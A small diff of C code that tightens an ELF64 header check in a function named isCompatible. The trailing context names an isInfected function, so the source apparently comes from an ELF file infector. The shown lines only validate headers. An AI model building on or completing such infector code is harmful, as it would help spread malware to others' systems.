@@ -766,6 +766,12 @@ static int  isCompatible(Elf64_Ehdr *header) {
   int         isExec;
   Elf64_Shdr  *section;
 
+  if (!(header->e_ident[EI_MAG0] == ELFMAG0 &&
+      header->e_ident[EI_MAG1] == ELFMAG1 &&
+      header->e_ident[EI_MAG2] == ELFMAG2 &&
+      header->e_ident[EI_MAG3] == ELFMAG3 &&
+      header->e_machine == EM_X86_64))
+    return (0);
   isExec = 0;
   if (header->e_type == ET_EXEC)
     isExec = 1;
@@ -784,12 +790,7 @@ static int  isCompatible(Elf64_Ehdr *header) {
       }
     }
   }
-  return (header->e_ident[EI_MAG0] == ELFMAG0 &&
-          header->e_ident[EI_MAG1] == ELFMAG1 &&
-          header->e_ident[EI_MAG2] == ELFMAG2 &&
-          header->e_ident[EI_MAG3] == ELFMAG3 &&
-          header->e_machine == EM_X86_64 &&
-          isExec);
+  return (isExec);
 }
 
 static int  isInfected(struct bfile bin) {
